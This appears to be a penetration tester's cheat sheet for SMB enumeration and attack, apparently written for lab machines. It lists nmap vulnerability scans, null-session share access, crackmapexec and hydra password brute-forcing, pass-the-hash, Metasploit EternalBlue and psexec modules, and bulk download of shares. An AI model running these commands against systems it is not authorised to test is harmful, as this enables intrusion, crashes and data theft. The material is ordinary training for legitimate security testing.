# SMB ENUMERTION

* nmap -v -p 139, 445 --script=smb-os-discovery 10.11.1.227
* nmap -v -p 139,445 --script=smb-vuln-ms08-067 --script-args=unsafe=1 10.11.1.5  Note: Try not to use unsafe=1 , it crashes
* smbclient  -L $IP -N
* crackmapexec smb 10.10.10.178
* smbclient \\\\$IP\\$Sharename   -N
* smbclient \\\\10.10.10.182\\Data -U r.thompson
* smbclient //192.168.58.131/kathy U Fred -N    ////user is fred
* smbclient -N //10.10.10.3/tmp  
if fails try below
* smbclient -N //10.10.10.3/tmp --option='client min protocol=NT1'

* or add to global  smb.cfg in linux : 

- client min protocol = CORE
- client max protocol = SMB3

* or add to  /etc/samba.smb.conf 

[global]
* client min protocol=NT1

* nmblookup -A 192.168.1.103
* nbtscan 192.168.58.179

* smbmap -H 192.168.1.102
* smbmap -H 192.168.1.102 -u ' '
* smbmap -H 192.168.1.102  -u ' ' -p ' '
* smbmap -H 192.168.1.102 -d metasploitable -u msfadmin -p msfadmin
* smbmap -H 192.168.1.102 -u 'msfadmin'   ////ramndom username to check drives
* crackmapexec smb 10.10.10.178 -u ‘xxx’ -p ‘’ --shares    ////to list available shares
* crackmapexec smb 10.10.10.178 -u somethu -p ‘someth’   ///to check we can login using evil winrm
* crackmapexec smb 10.10.10.178 -u somethu -p ‘someth’  -M spider_plus
* crackmapexec winrm 10.10.10.178 -u xxx -p thebox   ///to check we can login using evil winrm
* crackmapexec winrm 10.10.10.178 -u xxx -H hashvalue  
* crackmapexec smb 10.10.10.178 --pass-pol
* crackmapexec smb 10.10.10.175 -u users.txt -p pass_small.txt   ///bruteforce

* enum4linux 192.168.58.180

* nmap --script=smb-vuln* -p 139,445 192.168.58.180

* use exploit/windows/smb/ms17_010_eternalblue

* hydra -L user.txt -P pass.txt 192.168.1.101 smb   //Brute force 

* use auxiliary/scanner/smb/smb_login   //Brute force

* use auxiliary/scanner/smb/smb_enumusers   //Authenticated enumeration

* use exploit/windows/smb/psexec 

* use exploit/windows/smb/smb_delivery


### To Download
- smb>recurse ON
- >prompt OFF
- smb: \> mget *  Note: download all
